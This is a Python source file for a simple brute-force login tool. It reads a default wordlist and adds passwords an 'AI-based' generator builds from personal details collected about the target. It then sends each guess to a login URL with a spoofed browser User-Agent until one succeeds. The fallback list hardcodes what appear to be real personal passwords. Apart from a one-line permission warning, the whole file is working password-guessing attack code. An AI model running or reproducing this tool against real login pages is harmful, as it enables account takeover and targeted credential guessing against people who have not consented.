import requests
import time
from wordlist_generator import collect_user_info, generate_ai_wordlist

def load_default_wordlist(path: str = "default_wordlist.txt") -> list:
    """Load default wordlist or return fallback list."""
    try:
        with open(path, 'r', encoding='utf-8') as f:
            passwords = [line.strip() for line in f if line.strip()]
            print(f"[DEBUG] Loaded {len(passwords)} passwords from {path}: {passwords}")
            return passwords
    except FileNotFoundError:
        print("[!] Default wordlist not found! Using fallback list.")
        return ["admin", "123456", "Test@123", "@20Taffee@06", "Raiden@281205"]
    except Exception as e:
        print(f"[!] Error loading wordlist: {e}")
        return []

def brute_force(url: str, username: str, passwords: list, delay: float = 2.0) -> None:
    """Attempt brute-force login with provided passwords."""
    print("\n[*] Starting brute force attack...\n")
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/134.0.0.0",
        "Content-Type": "application/x-www-form-urlencoded"
    })

    for i, pwd in enumerate(passwords, 1):
        data = {"username": username, "password": pwd}
        try:
            response = session.post(url, data=data, timeout=5, allow_redirects=True)
            print(f"[DEBUG] Tried: {pwd} ({i}/{len(passwords)}), Status: {response.status_code}, URL: {response.url}")
            print(f"[DEBUG] Response headers: {response.headers}")

            if response.status_code == 200 and "success.html" in response.url:
                print(f"\n[+] Password FOUND: {pwd}")
                with open(f"response_success_{pwd}.html", "w", encoding="utf-8") as f:
                    f.write(response.text)
                print(f"[DEBUG] Success response saved to response_success_{pwd}.html")
                return
            elif response.status_code == 405:
                print(f"[-] Tried: {pwd} ({i}/{len(passwords)}) - HTTP 405 Method Not Allowed")
                print(f"[!] Server does not allow POST to {url}. Check the form's 'action' in index.html or use a server that supports POST (e.g., Flask).")
                return
            elif "Invalid username or password" in response.text:
                print(f"[-] Tried: {pwd} ({i}/{len(passwords)}) - Invalid credentials")
            else:
                print(f"[-] Tried: {pwd} ({i}/{len(passwords)}) - Unexpected response")

            time.sleep(delay)
        except requests.exceptions.ConnectionError as e:
            print(f"[!] Connection error: {e}")
            print("[!] Ensure the web server is running at http://127.0.0.1:5500")
            print("[!] Check if port 5500 is open: netstat -an | findstr :5500")
            return
        except requests.exceptions.RequestException as e:
            print(f"[!] Request failed for {pwd}: {e}")

    print("[*] Brute force complete. No password found.")

def main():
    """Main function to orchestrate the brute-force tool."""
    print("====== SIMPLE BRUTE FORCE TOOL ======")
    print("[!] WARNING: Use only on systems you own or have permission to test.")
    
    target_url = input("Target Login URL (e.g., http://127.0.0.1:5500/login.html): ").strip()
    if not target_url.startswith('http'):
        print("[!] URL must start with http:// or https://")
        return

    target_username = input("Target Username: ").strip()
    if not target_username:
        print("[!] Username cannot be empty")
        return

    default_pwds = load_default_wordlist()
    print("\n[+] Generating AI-based wordlist.")
    user_info = collect_user_info()
    try:
        ai_pwds = generate_ai_wordlist(user_info, min_length=6)
        print(f"[DEBUG] AI wordlist: {ai_pwds}")
    except Exception as e:
        print(f"[!] Failed to generate AI wordlist: {e}")
        ai_pwds = []

    final_wordlist = list(set(default_pwds + ai_pwds))
    print(f"[DEBUG] Final wordlist: {final_wordlist}")
    print(f"\n[+] Total passwords to try: {len(final_wordlist)}")

    brute_force(target_url, target_username, final_wordlist)

if __name__ == "__main__":
    main()
